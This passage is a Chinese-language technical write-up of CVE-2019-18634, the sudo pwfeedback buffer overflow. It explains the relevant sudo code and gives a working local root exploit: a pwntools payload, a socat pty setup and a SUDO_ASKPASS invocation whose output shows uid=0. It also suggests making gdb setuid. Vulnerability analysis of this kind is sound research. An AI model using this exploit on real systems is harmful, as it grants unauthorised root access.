###  调试
在分析的时候，查看内存是必不可少的，这里的做法是使用 gdb 结合 pwntools来调试
`poc2`对应的 py 代码如下
    import sys,os
    from pwn import *
    TARGET=os.path.realpath("/usr/local/bin/sudo")
    mfd, sfd = os.openpty()
    fd = os.open(os.ttyname(sfd), os.O_RDONLY)
    p = process([TARGET,"-S", "id"],stdin=fd)
    pause()
    payload = ("A"*100+"x15")*50
    os.write(mfd, payload+"n")
    pause()
    sys.exit(0)
运行上面这段代码，等 `pause()`的使用再用 gdb attach进程即可
这里需要注意sudo运行时是root权限，所以gdb也需要用root权限运行，可以使用root用户或者给gdb添加 s权限`chmod 4777
/usr/bin/gdb`
## 漏洞利用
从前面的分析可以知道漏洞是可以溢出写buf，那么我们首先要要出buf在哪里
        static const char *askpass;
        static char buf[SUDO_CONV_REPL_MAX + 1];// 255+1
        int i, input, output, save_errno, neednl = 0, need_restart;
        debug_decl(tgetpass, SUDO_DEBUG_CONV)
buf 在 `tgetpass`函数定义，是`static` 类型，存放在内存的bss段上，所以可能可以溢出覆盖bss的一些内容
ida找一下引用可以看到 `buf`高地址的一些变量，其中 `singo` 表示运行时的一些信号，正常运行时值为0
`tgetpass_flags` 是sudo的一些标识位，一些功能的启用与否等. `askpass`和 `user_details`
比较重要，我们看看它们是如何被使用的
###  user_details变量
`user_details` 字段保存的是用户的一些身份信息，如 uid， pid 等，
###  askpass
askpass和`sudo -A` 选项有关，作用是可以选择一个外部程序来传入密码。
具体的流程是
  * 1 环境变量`SUDO_ASKPASS` 指定外部程序地址
  * 2 sudo 运行加上`-A`选项，程序里面会设置`TGP_ASKPASS` 标识
  * 3 fork 出一个子进程来运行外部程序，父进程接收子进程的输出作为密码
具体代码在 `tgetpass` 函数开始处找到
     if (askpass == NULL) {
        askpass = getenv_unhooked("SUDO_ASKPASS");
        if (askpass == NULL || *askpass == '')
            askpass = sudo_conf_askpass_path();
        }
    ...
      /* If using a helper program to get the password, run it instead. */
        if (ISSET(flags, TGP_ASKPASS)) {
        if (askpass == NULL || *askpass == '')
            sudo_fatalx(U_("no askpass program specified, try setting SUDO_ASKPASS"));
        debug_return_str_masked(sudo_askpass(askpass, prompt));
        }
功能的具体实现可以在`sudo_askpass` 函数找到
    static char *
    sudo_askpass(const char *askpass, const char *prompt)
    {
        ...
        child = sudo_debug_fork();
        if (child == 0) {
         // 子进程运行外部程序
        if (setuid(ROOT_UID) == -1)
            sudo_warn("setuid(%d)", ROOT_UID);
        if (setgid(user_details.gid)) {
            sudo_warn(U_("unable to set gid to %u"), (unsigned int)user_details.gid);
            _exit(255);
        }
        if (setuid(user_details.uid)) {
            sudo_warn(U_("unable to set uid to %u"), (unsigned int)user_details.uid);
            _exit(255);
        }
        closefrom(STDERR_FILENO + 1);
        //
        execl(askpass, askpass, prompt, (char *)NULL);
        sudo_warn(U_("unable to run %s"), askpass);
        _exit(255);
        }
        //父进程从子进程获取输入流，
        /* Get response from child (askpass). */
        pass = getln(pfd[0], buf, sizeof(buf), 0);
        /* Wait for child to exit. */
        for (;;) {
        pid_t rv = waitpid(child, &status, 0);
    }
`sudo_askpass`会fork出一个子进程来运行外部程序，子进程的输出作为父进程的输入，这使用会调用
`getln`函数，但并不会启用`pwfeedback` 机制。
子进程的权限通过`user_details.uid`和`user_details.gid`来设置，这两个值我们是可以通过漏洞改写掉的，也就是说我们可以通过这里用root权限来运行程序
###  漏洞利用
okay 我们整理一下当前获取到的点
  * 1 在不使用 `askpass`的情况下会使用 `pwfeedback`
  * 2 用`pwfeedback`的漏洞可以修改 `user_details`的uid和gid
  * 3 `askpass` 可以根据`user_details`的uid和gid运行外部程序
我们知道，默认情况下 `sudo -s` 可以有三次输入密码的机会，这个也是可以利用的点，基本利用流程如下
  * 1 设置环境变量`SUDO_ASKPASS`指定外部程序，不加 `-A`选项
  * 2 利用 漏洞将 `user_details` 的 pid 和 gid 覆盖成 0 ， 并启用`askpass`功能(TGP_ASKPASS flags)
  * 3 第二次输入密码 ，root 权限运行外部程序
漏洞利用的代码可以参考[iamalsaher的代码](https://github.com/iamalsaher/CVE-POCs/blob/master/CVE-2019-18634.py)
这里我给出自己的利用过程作为参考
    prb@prbvv:~/sudo-cve-2019-18634$ cat aa.sh 
    #!/bin/bash
    id > end
    prb@prbvv:~/sudo-cve-2019-18634$ python -c "from pwn import *;print 'x00x15'*548+p64(6)+'x00x15'*20+p64(0)*2+p32(0)+'x00'*3+'n'" > poc
    prb@prbvv:~/sudo-cve-2019-18634$ socat pty,link=/tmp/pty,waitslave exec:"cat /home/prb/sudo-cve-2019-18634/poc" &
    [1] 2380
    prb@prbvv:~/sudo-cve-2019-18634$ SUDO_ASKPASS=/home/prb/sudo-cve-2019-18634/aa.sh sudo -S id < /tmp/pty
    密码：
    对不起，请重试。
    sudo: 1 次错误密码尝试
    prb@prbvv:~/sudo-cve-2019-18634$ cat end
    uid=0(root) gid=1000(prb) 组=1000(prb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
    [1]+  已完成               socat pty,link=/tmp/pty,waitslave exec:"cat /home/prb/sudo-cve-2019-18634/poc"
    prb@prbvv:~/sudo-cve-2019-18634$ ls
    aa.sh  e1xp.py  end  exp.py  exp.sh  mm  poc  sudo  sudo-1.8.25  sudo-1.8.25.tar.gz
## 小结
CVE-2019-18634 是一个 bss变量溢出漏洞，只有在开启
`pwfeedback`机制的时候才可能触发，最终利用可以使用root权限执行任意程序，危害较大。
## 引用
  * [漏洞补丁](https://github.com/sudo-project/sudo/commit/fa8ffeb17523494f0e8bb49a25e53635f4509078)
  * [CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled](https://seclists.org/oss-sec/2020/q1/48)
  * [A CVE Journey: From Crash to Local Privilege Escalation](https://iamalsaher.tech/posts/2020-02-08-cve-2019-18634/)